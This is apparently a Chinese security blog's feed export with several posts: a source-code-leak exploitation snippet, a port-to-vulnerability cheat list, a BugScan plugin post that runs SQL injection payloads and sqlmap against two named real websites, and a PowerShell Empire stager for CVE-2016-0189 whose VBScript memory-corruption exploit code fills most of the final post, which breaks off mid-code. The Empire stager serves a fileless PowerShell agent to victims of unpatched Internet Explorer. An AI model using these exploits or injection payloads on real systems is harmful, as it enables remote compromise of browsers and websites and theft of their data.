dir</div></pre></td></tr></table></figure><p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk changes</div></pre></td></tr></table></figure><h4 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h4><h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure><h3 id="神器"><a href="#神器" class="headerlink" title="神器"></a>神器</h3><p><a href="[http://www.bitkeeper.com/installation.instructions](http://www.bitkeeper.com/installation.instructions">Bitkeeper</a>)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="external">weakfilescan</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>PORT=&gt;服务/漏洞</title>
      <link href="/2017/01/24/PORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E/"/>
      <url>/2017/01/24/PORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>范围：0-65535<br>固定端口：0-1023 1024保留<br>动态端口：1024-65535</p><h4 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h4><p>21：FTP(爆破)</p><p>22：SSH(爆破)</p><p>23：Telnet(爆破)</p><p>25：SMTP</p><p>53：DNS（UDP）</p><p>69：TFTP（cisco，类似FTP）</p><p>79：Finger</p><p>80：HTTP</p><p>110：POP3</p><p>111：RPC 远程过程调用</p><p>113：windows 验证服务</p><p>119：NNTP 网络新闻组传输协议</p><p>135：RPC 远程过程调用</p><p>137：NetBIOS</p><p>139：windows文件和打印机共享，Unix中的samba服务</p><p>161：SNMP 简单网络管理协议</p><p>389：LDAP</p><p>443：HTTPS</p><p>445：SMB</p><p>1080：socks代理服务</p><p>2082/2083 cpanel主机管理系统登陆 (国外用较多)</p><p>2222 DA虚拟主机管理系统登陆 (国外用较多)</p><p>2601,2604：zebra路由，默认密码zebra</p><p>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </p><p>3312/3311 kangle主机管理系统登陆 </p><p>3389:远程桌面</p><p>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </p><p>5900：vnc</p><p>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</p><p>7001,7002 WebLogic默认弱口令，反序列</p><p>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </p><p>8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 </p><p>8080,8089,9090 JBOSS</p><p>8083 Vestacp主机管理系统 （国外用较多） </p><p>8649 ganglia </p><p>8888 amh/LuManager 主机管理系统默认端口 </p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p><p>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </p><p>11211 memcache未授权访问 </p><p>27017,27018 Mongodb未授权访问 </p><p>28017 mongodb统计页面 </p><p>50000 SAP命令执行 </p><p>50070,50030 hadoop默认端口未授权访问</p><h4 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>3306：mysql<br>1433：mssqlserver<br>1434：sqlserver monitor<br>1521：oracle:(iSqlPlus Port:5560,7778)<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p><h4 id="特殊服务（漏洞）"><a href="#特殊服务（漏洞）" class="headerlink" title="特殊服务（漏洞）"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血</p><p>512,513,514：Rsync未授权访问</p><p>873：Rsync未授权访问</p><p>1025,111 NFS </p><p>2375：docker remote api漏洞</p><p>50000：SAP命令执行</p><p>5984：CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a></p><p>6379：redis未授权</p><p>7001,7002：WebLogic 默认弱口令，反序列化</p><p>9200,9300：elasticsearch未授权访问</p><p>11211：memcache未授权访问</p><p>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>BugScan插件编写</title>
      <link href="/2017/01/22/BugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2017/01/22/BugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      <content type="html"><![CDATA[<p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p><p>下面就让我们看看这个题目：</p><p>某通用平台被曝出有一处高危注入，以下为详情：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1</div></pre></td></tr></table></figure><p>userName处为一处报错注入，</p><p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/</div><div class="line">http://www.globechildren.com/</div></pre></td></tr></table></figure><p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p><p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version--</div></pre></td></tr></table></figure><p>也可以sqlmap跑一下看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;</div><div class="line">[22:07:32] [INFO] testing connection to the target URL</div><div class="line">sqlmap resumed the following injection point(s) from stored session:</div><div class="line">---</div><div class="line">Parameter: userName (GET)</div><div class="line">Type: error-based</div><div class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAv</div><div class="line">Type: stacked queries</div><div class="line">Title: Microsoft SQL Server/Sybase stacked queries (comment)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--</div><div class="line">Type: AND/OR time-based blind</div><div class="line">Title: Microsoft SQL Server/Sybase time-based blind (comment)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;--</div><div class="line">---</div><div class="line">[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Server</div><div class="line">web server operating system: Windows 2008 R2 or 7</div><div class="line">web application technology: ASP.NET, Microsoft IIS 7.5</div><div class="line">back-end DBMS: Microsoft SQL Server 2005</div><div class="line">[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos;</div></pre></td></tr></table></figure><p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p><p>打印MD5呢，mssql有两种方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--</div><div class="line"></div><div class="line">2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--</div></pre></td></tr></table></figure><p>直接上我写的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/evn python</span></div><div class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">POC Name : 泡妹专享</div><div class="line">Author : zeroyu</div><div class="line">mail : zeroyu.xyz@gmail.com</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line"><span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</div><div class="line"><span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></div><div class="line">url = arg + payload</div><div class="line">code, head, res, errcode, _ = hackhttp.http(url)</div><div class="line">time.sleep(<span class="number">1</span>)</div><div class="line"><span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</div><div class="line">security_hole(url)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line"><span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure><p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="external">文档</a>去。</p><p>好，今天妹子就泡到这儿。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT</title>
      <link href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/"/>
      <url>/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/</url>
      <content type="html"><![CDATA[<p>​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。<br>在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></div><div class="line"></div><div class="line">        self.info = &#123;</div><div class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</div><div class="line"></div><div class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</div><div class="line"></div><div class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</div><div class="line"></div><div class="line">            <span class="string">'Comments'</span>: [</div><div class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></div><div class="line">        self.options = &#123;</div><div class="line">            <span class="comment"># format:</span></div><div class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></div><div class="line">            <span class="string">'Listener'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'StagerRetries'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'OutFile'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Base64'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></div><div class="line">            &#125;,            </div><div class="line">            <span class="string">'UserAgent'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Proxy'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'ProxyCreds'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></div><div class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></div><div class="line">        self.mainMenu = mainMenu</div><div class="line"></div><div class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">            <span class="comment"># parameter format is [Name, Value]</span></div><div class="line">            option, value = param</div><div class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</div><div class="line">                self.options[option][<span class="string">'Value'</span>] = value</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        <span class="comment"># extract all of our options</span></div><div class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</div><div class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</div><div class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</div><div class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</div><div class="line"></div><div class="line">        encode = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</div><div class="line">            encode = <span class="keyword">True</span></div><div class="line"></div><div class="line">        <span class="comment"># generate the launcher code</span></div><div class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</div><div class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">code =  <span class="string">"&lt;html&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;head&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;/head&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;body&gt;\n"</span></div><div class="line">code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></div><div class="line">code += <span class="string">"        Dim aw\n"</span></div><div class="line">code += <span class="string">"        Dim plunge(32)\n"</span></div><div class="line">code += <span class="string">"        Dim y(32)\n"</span></div><div class="line">code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></div><div class="line">code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></div><div class="line">code += <span class="string">"        b = String(64000, \"D\")\n"</span></div><div class="line">code += <span class="string">"        c = d &amp; b\n"</span></div><div class="line">code += <span class="string">"        x = UnEscape(c)\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Class ArrayWrapper\n"</span></div><div class="line">code += <span class="string">"            Dim A()\n"</span></div><div class="line">code += <span class="string">"            Private Sub Class_Initialize\n"</span></div><div class="line">code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></div><div class="line">code += <span class="string">"            End Sub\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            Public Sub Resize()\n"</span></div><div class="line">code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></div><div class="line">code += <span class="string">"            End Sub\n"</span></div><div class="line">code += <span class="string">"        End Class\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Class Dummy\n"</span></div><div class="line">code += <span class="string">"        End Class\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Function getAddr (arg1, s)\n"</span></div><div class="line">code += <span class="string">"            aw = Null\n"</span></div><div class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">code += <span class="string">"                Set plunge(i) = s\n"</span></div><div class="line">code += <span class="string">"            Next\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            Dim addr\n"</span></div><div class="line">code += <span class="string">"            Dim i\n"</span></div><div class="line">code += <span class="string">"            For i = 0 To 31\n"</span></div><div class="line">code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></div><div class="line">code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></div><div class="line">code += <span class="string">"                End If\n"</span></div><div class="line">code += <span class="string">"                y(i) = Null\n"</span></div><div class="line">code += <span class="string">"            Next\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            If addr = Null Then\n"</span></div><div class="line">code += <span class="string">"                document.location.href = document.location.href\n"</span></div><div class="line">code += <span class="string">"                Return\n"</span></div><div class="line">code += <span class="string">"            End If\n"</span></div><div class="line">code += <span class="string">"            getAddr = addr\n"</span></div><div class="line">code += <span class="string">"        End Function\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></div><div class="line">code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></div><div class="line">code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            aw = Null\n"</span></div><div class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            Dim o\n"</span></div><div class="line">code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            leakMem = o\n"</span></div><div class="line">code += <span class="string">"        End Function\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></div><div class="line">code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></div><div class="line">code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            aw = Null\n"</span></div><div class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></div><div class="line">code += <span class="string">"        End Sub\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Function exploit (arg1)\n"</span></div><div class="line">code += <span class="string">"            Dim addr\n"</span></div><div class="line">code += <span class="string">"            Dim csession\n"</span></div><div class="line">code += <span class="string">"            Dim olescript\n"</span></div><div class="line">code += <span class="string">"            Dim mem\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            Set dm = New Dummy\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></div><div class="line">code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code 